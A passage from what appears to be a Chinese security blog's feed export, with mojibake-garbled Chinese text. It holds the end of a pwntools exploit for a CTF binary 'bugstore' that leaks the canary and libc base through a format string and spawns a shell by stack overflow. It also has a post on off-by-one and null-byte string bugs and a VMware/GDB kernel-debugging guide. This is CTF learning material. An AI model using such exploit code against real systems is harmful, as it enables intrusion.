class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># (F)ormat String Bug</span></span><br><span class="line"><span class="comment"># (A)rbitrary Write</span></span><br><span class="line"><span class="comment"># (S)tack Overflow</span></span><br><span class="line"><span class="comment"># (E)xit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fortmat</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arbitrary</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line"><span class="comment">#break </span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">break *(0x555555554000 + 0xD95)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDD3)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDBB)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDC7)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xCE1)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xCE6)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC9D)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC10)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC13)</span></span><br><span class="line"><span class="string">  breka *(0x555555554000 + 0xC31)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC55)</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bugstore&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">fortmat(<span class="string">&#x27;%p|&#x27;</span>*<span class="number">60</span>)                       <span class="comment">#canary 0x7fffffffde68</span></span><br><span class="line"><span class="comment">#leak </span></span><br><span class="line">leakmsg = str(io.readline()).strip(<span class="string">&#x27;|&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">r8_addr = int(leakmsg[<span class="number">2</span>],<span class="number">16</span>)+<span class="number">0x28</span></span><br><span class="line">canary = int(leakmsg[<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">code_base = int(leakmsg[<span class="number">4</span>],<span class="number">16</span>)<span class="number">-0xdf0</span></span><br><span class="line">libc_base = int(leakmsg[<span class="number">9</span>],<span class="number">16</span>)<span class="number">-243</span>-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;r8 addr :&#123;&#125;&quot;</span>.format(hex(r8_addr)))</span><br><span class="line">log.info(<span class="string">&quot;canary vaule:&#123;&#125;&quot;</span>.format(hex(canary)))</span><br><span class="line">log.info(<span class="string">&quot;code base:&#123;&#125;&quot;</span>.format(hex(code_base)))</span><br><span class="line">log.info(<span class="string">&quot;libc base:&#123;&#125;&quot;</span>.format(hex(libc_base)))</span><br><span class="line"><span class="comment"># some addr</span></span><br><span class="line">pop_rdi_ret = code_base+<span class="number">0x0000000000000e53</span></span><br><span class="line">system_addr = libc_base+system_offset</span><br><span class="line">binsh_addr = libc_base+binsh_offset</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line">arbitrary(str(r8_addr))</span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;BUGSTORE&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span>+canary+<span class="string">&quot;B&quot;</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x45556</span>)</span><br><span class="line">stack(payload) </span><br><span class="line">raw_input(<span class="string">&quot;----wait debug -----&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­—ç¬¦ä¸²æ“ä½œä¸‹çš„Pwn</title>
      <link href="about-some-string-opearting-pwn.html"/>
      <url>about-some-string-opearting-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²"><a href="#ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²" class="headerlink" title="ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²"></a>ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²</h1><p>Cé£æ ¼çš„å­—ç¬¦ä¸²æ˜¯æŒ‡ç”±ä¸€ä¸ªè¿ç»­çš„å­—ç¬¦åºåˆ—ç»„æˆï¼Œå¹¶ä¸”ä»¥ä¸€ä¸ªç©ºå­—ç¬¦ï¼ˆnullï¼‰ä½œä¸ºç»“æŸã€‚ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆå®é™…ä¸Šå°±æ˜¯æŒ‡å‘è¯¥å­—ç¬¦ä¸²çš„èµ·å§‹ã€‚å­—ç¬¦ä¸²é•¿åº¦æŒ‡çš„æ˜¯ç©ºå­—ç¬¦ä¹‹å‰çš„å­—èŠ‚æ•°ã€‚</p><h1 id="å¸¸è§æ“ä½œé”™è¯¯"><a href="#å¸¸è§æ“ä½œé”™è¯¯" class="headerlink" title="å¸¸è§æ“ä½œé”™è¯¯"></a>å¸¸è§æ“ä½œé”™è¯¯</h1><h2 id="æ— è¾¹ç•Œå­—ç¬¦ä¸²å¤åˆ¶"><a href="#æ— è¾¹ç•Œå­—ç¬¦ä¸²å¤åˆ¶" class="headerlink" title="æ— è¾¹ç•Œå­—ç¬¦ä¸²å¤åˆ¶"></a>æ— è¾¹ç•Œå­—ç¬¦ä¸²å¤åˆ¶</h2><p> æˆ‘ä»¬å¸¸è§çš„ç¼“å†²åŒºæº¢å‡ºä¸€åŠå°±ä¼šå‘ç”Ÿåœ¨è¿™é‡Œã€‚</p><p>æ— è¾¹é™…å­—ç¬¦ä¸²å¤åˆ¶ï¼Œå®é™…ä¸Šæ˜¯è¯»å–æ•°æ®ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªå®šé•¿å®šç¼“å†²åŒºä¸­ã€‚å¦‚æˆ‘ä»¬å¸¸è§å®šæ ˆæº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your Name:\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯å¸¸è§çš„æ— è¾¹ç•Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œgetsè¿™ä¸ªä½ç½®æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºç‚¹ã€‚é™¤äº†gets ï¼Œè¿˜æœ‰strcpy(),strcat()ç­‰ç­‰å‡½æ•°ã€‚</p><h2 id="å·®ä¸€é”™è¯¯"><a href="#å·®ä¸€é”™è¯¯" class="headerlink" title="å·®ä¸€é”™è¯¯"></a>å·®ä¸€é”™è¯¯</h2><p>å…¶å®å·®ä¸€é”™è¯¯ï¼Œæ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´ç­‰off-by-oneã€‚ã€‚çœ‹å‡ ä¸ªä¾‹å­ï¼š<br>my_gets å‡½æ•°å¯¼è‡´äº†ä¸€ä¸ªoff-by-oneæ¼æ´ï¼ŒåŸå› æ˜¯forå¾ªç¯çš„è¾¹ç•Œæ²¡æœ‰æ§åˆ¶å¥½å¯¼è‡´å†™å…¥å¤šæ‰§è¡Œäº†ä¸€æ¬¡ï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºæ …æ é”™è¯¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my_gets å‡½æ•°å¯¼è‡´äº†ä¸€ä¸ªoff-by-oneæ¼æ´ï¼ŒåŸå› æ˜¯forå¾ªç¯çš„è¾¹ç•Œæ²¡æœ‰æ§åˆ¶å¥½å¯¼è‡´å†™å…¥å¤šæ‰§è¡Œäº†ä¸€æ¬¡ï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºæ …æ é”™è¯¯<br>off-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚å…¶ä¸­è¾¹ç•ŒéªŒè¯ä¸ä¸¥é€šå¸¸åŒ…æ‹¬</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯(è¿™åœ¨ C è¯­è¨€åˆå­¦è€…ä¸­å¾ˆå¸¸è§)å¯¼è‡´å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚ã€‚</li><li>å­—ç¬¦ä¸²æ“ä½œä¸åˆé€‚<h2 id="ç©ºç»“å°¾é”™è¯¯"><a href="#ç©ºç»“å°¾é”™è¯¯" class="headerlink" title="ç©ºç»“å°¾é”™è¯¯"></a>ç©ºç»“å°¾é”™è¯¯</h2>è¿™ç§åˆå±äº off-by-one çš„ä¸€ä¸ªåˆ†æ”¯ç§°ä¸º NULL byte off-by-one<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ç¨‹åºä¹çœ‹ä¸Šå»æ²¡æœ‰ä»»ä½•é—®é¢˜(ä¸è€ƒè™‘æ ˆæº¢å‡º)ï¼Œå¯èƒ½å¾ˆå¤šäººåœ¨å®é™…çš„ä»£ç ä¸­ä¹Ÿæ˜¯è¿™æ ·å†™çš„ã€‚ ä½†æ˜¯ strlen å’Œ strcpy çš„è¡Œä¸ºä¸ä¸€è‡´å´å¯¼è‡´äº†off-by-one çš„å‘ç”Ÿã€‚ strlen æ˜¯æˆ‘ä»¬å¾ˆç†Ÿæ‚‰çš„è®¡ç®— ascii å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦æ—¶æ˜¯ä¸æŠŠç»“æŸç¬¦ <code>\x00</code> è®¡ç®—åœ¨å†…çš„ï¼Œä½†æ˜¯ strcpy åœ¨å¤åˆ¶å­—ç¬¦ä¸²æ—¶ä¼šæ‹·è´ç»“æŸç¬¦ <code>\x00</code>ã€‚è¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å‘chunk1ä¸­å†™å…¥äº†25ä¸ªå­—èŠ‚.</li></ul><h1 id="off-one-by-åœ¨å †ä¸Šçš„åˆ©ç”¨"><a href="#off-one-by-åœ¨å †ä¸Šçš„åˆ©ç”¨" class="headerlink" title="off-one-by åœ¨å †ä¸Šçš„åˆ©ç”¨"></a>off-one-by åœ¨å †ä¸Šçš„åˆ©ç”¨</h1><p>ä¸€èˆ¬æ¥è¯´ï¼Œå•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯å› ä¸º Linux çš„å †ç®¡ç†æœºåˆ¶ ptmalloc éªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäºLinuxå †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§ã€‚ æ­¤å¤–ï¼Œéœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯ off-by-one æ˜¯å¯ä»¥åŸºäºå„ç§ç¼“å†²åŒºçš„ï¼Œæ¯”å¦‚æ ˆã€bss æ®µç­‰ç­‰ï¼Œä½†æ˜¯å †ä¸Š(heap based)çš„off-by-one æ˜¯ CTF ä¸­æ¯”è¾ƒå¸¸è§çš„ã€‚æˆ‘ä»¬è¿™é‡Œä»…è®¨è®ºå †ä¸Šçš„ off-by-one æƒ…å†µã€‚</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>Asis CTF 2016çš„ä¸€é“é¢˜ç›®ï¼Œè€ƒå¯Ÿç‚¹æ˜¯null byte off-by-one</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æ¼æ´ä¸»è¦æ˜¯åœ¨createä¸­myreadé‡Œï¼Œreadå‡½æ•°å¯ä»¥å‘ç°å¯¹äºè¾¹ç•Œçš„è€ƒè™‘æ˜¯ä¸å½“çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">myread_9F5</span><span class="params">(_BYTE *ptr_buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = ptr_buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ä¿æŠ¤å¼€å¯çŠ¶å†µå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  off-one-by checksec b00ks</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/ctf-wiki/off-one-by/b00ks&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘å°† ç³»ç»ŸéšæœºåŒ–å…³é—­ï¼Œé‚£ä¹ˆä¹‹åç¨‹åºåŸºå€å°†ä¿æŒä¸å˜ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> strings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨VMwareå’ŒGDBè¿›è¡ŒLinuxå†…æ ¸è°ƒè¯•</title>
      <link href="Linux_Kernel_Debugging_with_VMware_and_GDB.html"/>
      <url>Linux_Kernel_Debugging_with_VMware_and_GDB.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>ä¹‹å‰æ­è¿‡ä»¥qemu+gdbæ­å†…æ ¸è°ƒè¯•ç¯å¢ƒï¼Œåœ¨è¿™æ¬¡å­¦ä¹ <code>Ubuntu 16.04 ebpf arbitrary read/write </code>çš„åˆ†æçš„æ—¶å€™ï¼Œæ¢äº†ä¸€ä¸ªä»¥ VMware å’Œ GDBçš„ç¯å¢ƒè¿›è¡Œè°ƒè¯•ã€‚</p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Host: Mac OS X  , VMware Fusion</p><p>Guest: Ubuntu Linux 14.04 x64</p><h2 id="Step-1-Configure-your-host"><a href="#Step-1-Configure-your-host" class="headerlink" title="Step 1: Configure your host"></a>Step 1: Configure your host</h2><p>ç¬¬ä¸€æ­¥å½“ç„¶æ˜¯è¦å®‰è£…VMware å’Œå®‰è£…ç›¸åº”å†…æ ¸çš„linuxç³»ç»Ÿã€‚å½“æˆ‘ä»¬å®‰è£…å®Œä¹‹åï¼Œåœ¨è™šæ‹Ÿæœºçš„ç›®å½•ä¸‹æ‰¾åˆ°xxx.vmxæ–‡ä»¶ï¼Œæ·»åŠ ä¸€è¡Œå†…å®¹ã€‚<br><code>debugStub.listen.guest64 = &quot;1&quot;</code> å¦‚æœæ˜¯32ä½ç¯å¢ƒï¼Œå°†64è¿›è¡Œæ›¿æ¢ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-01.jpg"></a></p><h2 id="Step-2-Configure-your-guest"><a href="#Step-2-Configure-your-guest" class="headerlink" title="Step 2: Configure your guest"></a>Step 2: Configure your guest</h2><p>æˆ‘ä»¬é¦–å…ˆå¾—ç¼–è¯‘å¥½ç›¸å…³çš„å†…æ ¸ï¼Œå…³äºå†…æ ¸ç¼–è¯‘çš„å†…å®¹å°±ä¸åœ¨è¿™å¤è¿°ï¼Œæˆ‘ä»¬éœ€è¦ç¼–è¯‘å®Œæˆçš„vmlinuxæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°†ä½œä¸ºç¬¦å·ä¿¡æ¯æœ€ç»ˆå°†ç¥­ç¥€ç»™GDB</p><h2 id="Step-3-Build-and-Connect-GDB"><a href="#Step-3-Build-and-Connect-GDB" class="headerlink" title="Step 3: Build and Connect GDB"></a>Step 3: Build and Connect GDB</h2><p>ç”±äºmac osç¯å¢ƒä¸‹çš„ <code>brew install</code> çš„GDBä¸æ”¯æŒlinuxç›¸å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—è‡ªå·±ç¼–è¯‘ä¸€ä¸ªGDBï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-8.1.tar.gz</span><br><span class="line">tar xf gdb-8.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> gdb-8.1</span><br><span class="line">./configure --build=x86_64-apple-darwin14.0.0 --target=x86_64-vfs-linux --with-python &amp;&amp; make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>é€šè¿‡configureçš„è®¾ç½®ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¯‘å¾—åˆ°å’±ä»¬æƒ³è¦çš„GDBæ¨¡å¼ã€‚</p><p>macçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>/usr/local/bin</code>æ‰¾åˆ°æˆ‘ä»¬ç¼–è¯‘å®‰è£…åçš„GDB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># swing @ swingdeMacBook-Pro in &#x2F;usr&#x2F;local&#x2F;bin [17:18:19]</span><br><span class="line">$ find .&#x2F; | grep gdb</span><br><span class="line">.&#x2F;&#x2F;gdb</span><br><span class="line">.&#x2F;&#x2F;gdbus-codegen</span><br><span class="line">.&#x2F;&#x2F;.gdb_history</span><br><span class="line">.&#x2F;&#x2F;x86_64-vfs-linux-gdb</span><br><span class="line">.&#x2F;&#x2F;gdbm_dump</span><br><span class="line">.&#x2F;&#x2F;gdbus</span><br><span class="line">.&#x2F;&#x2F;gdbmtool</span><br><span class="line">.&#x2F;&#x2F;gdbm_load</span><br></pre></td></tr></table></figure><h1 id="Start-Debugging"><a href="#Start-Debugging" class="headerlink" title="Start Debugging"></a>Start Debugging</h1><p>ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦è¿è¡Œæˆ‘ä»¬ç¼–è¯‘åçš„GDBç‰ˆæœ¬ï¼Œç„¶åfile vmlinuxï¼ŒåŠ è½½ç¬¦å·ä¿¡æ¯ï¼Œç„¶åé€šè¿‡<br><code>target remote :8864</code> ps ï¼š32ä½æ›¿æ¢64å³å¯ã€‚<br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å’±ä»¬çš„è°ƒè¯•ä¹‹æ—…äº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-02.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 backdoor CTF</title>
      <link href="2018-backdoor-CTF-Pwn.html"/>
      <url>2018-backdoor-CTF-Pwn.html</url>
      
